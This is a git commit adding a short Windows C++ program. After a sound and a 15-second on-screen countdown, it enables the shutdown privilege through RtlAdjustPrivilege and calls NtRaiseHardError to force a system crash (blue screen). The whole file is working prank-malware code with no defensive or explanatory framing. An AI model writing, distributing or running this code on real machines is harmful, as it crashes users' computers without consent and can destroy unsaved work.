cb8e7b8eddb43d3fee2005519943b103ee6f45b2
Alphons <93847055+Crazypersonalph@users.noreply.github.com>
2022-09-12 18:18:45 +0800

    first commit

---
+++ src/main.cpp
@@ -0,0 +1,29 @@
+#include <Windows.h>
+#include <iostream>
+
+#pragma comment(lib, "ntdll.lib")
+
+
+EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
+
+EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
+
+int main(void)
+{
+     int counter = 15;
+     PlaySoundA("FX9eEhoRZhY.wav", NULL, SND_ASYNC | SND_FILENAME);
+
+     while (counter >= 1)
+     {
+        std::cout << "\rTime remaining: " << counter << std::endl;
+        Sleep(1000);
+        counter--;
+     }
+
+     BOOLEAN bl;
+     RtlAdjustPrivilege(19, TRUE, FALSE, &bl);
+     unsigned long response;
+     NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
+
+     return 0;
+}
